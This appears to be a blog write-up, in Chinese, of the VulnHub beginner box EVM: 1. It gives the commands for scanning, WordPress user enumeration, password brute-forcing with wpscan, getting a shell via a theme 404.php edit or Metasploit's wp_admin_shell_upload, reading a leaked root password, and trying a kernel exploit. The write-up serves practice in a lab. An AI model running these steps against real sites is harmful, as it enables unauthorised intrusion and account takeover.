---
title: EVM-1
author: Creexile
date: 2025-01-06 20:26:45
lastMod: 2025-01-06
summary: 'easyNo.7'
cover: ''
category: '靶场'
draft: false
comments: false
sticky: 0
tags: [漏洞利用, 爆破, 信息收集, 渗透]
---

# EVM: 1

---

easyNo.7

> 来源: [vulnhub靶场-EVM: 1](https://www.vulnhub.com/entry/evm-1,391/)
>
> 目标: root
>
> 描述: This is super friendly box intended for Beginner's
>
> 妙妙工具: `python -c 'import pty; pty.spawn("/bin/bash")'`

## 环境配置

- kali: 192.168.56.5
- target: 192.168.56.103

## 信息收集

nmap一扫, 嘿! 还挺多

```
nmap -sS 192.168.56.0/24

PORT    STATE SERVICE
22/tcp  open  ssh
53/tcp  open  domain
80/tcp  open  http
110/tcp open  pop3
139/tcp open  netbios-ssn
143/tcp open  imap
445/tcp open  microsoft-ds
```

dirsearch目录扫描, 居然是wordpress

```
[05:46:40] 200 -   22KB - /info.php
[05:46:54] 500 -    0B  - /wp-config.php
[05:46:55] 200 -    1KB - /wordpress/wp-login.php
[05:46:55] 200 -    4KB - /wordpress/
```

从`/info.php`可以得到似乎开启了disable_functions选项

尝试爆破一些wordpress的常见用户密码, 无用, 试试之前用的wpscan

不需要WPScan API Token也能拿到一个用户: c0rrupt3d_brain; 然后同样不需要Token也能进行爆破

```bash
wpscan --url http://192.168.56.103/wordpress -e u
# c0rrupt3d_brain
wpscan --url http://192.168.56.103/wordpress -U c0rrupt3d_brain -P /usr/share/wordlists/rockyou.txt
# c0rrupt3d_brain : 24992499
```

> 利用`gzip -d rockyou.txt.gz`自行解压

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250106191222.png)

## getshell

可以用msf, 可以手动getshell

### 手动

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250106195114.png)

Update后访问下面这个url去getshell

```
http://192.168.56.103/wordpress/wp-content/themes/twentynineteen/404.php
```

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250106195250.png)

开了disable_functions么? 如开

### msf

```
msfconsole
search wordpress
use exploit/unix/webapp/wp_admin_shell_upload
set lhost 192.168.56.5
set rhost 192.168.56.103
set username c0rrupt3d_brain
set password 24992499
set targeturi /wordpress
run
```

## 信息收集

```bash
# 系统信息 Linux ubuntu-extermely-vulnerable-m4ch1ine 4.4.0-87-generic #110-Ubuntu SMP Tue Jul 18 12:55:35 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
uname -a
# 内核版本 4.4.0-87-generic
uname -r
# 查看环境
python -h
nc -h
# 查看特权文件, 无
find / -perm -4000 2>/dev/null
```

虽然是www-data, 但是却可以访问`/home`下的用户文件

到达`/home/root3r`, 太美丽了`.root_password_ssh.txt`, 直接cat就能拿到看起来像是密码的东西

```
willy26
```

## 提权

尝试切换用户/重新登录, 发现可以切换为root

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250106201020.png)

然后可以在`/root`目录下找到祝贺语

内核的版本比较眼熟, 虽然没有gcc, 但是也可以试一试; 然后就没救了

```bash
locate linux/local/45010.c
gcc 45010.c -o 45010p -pthread
# ./45010p: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./45010p)
```
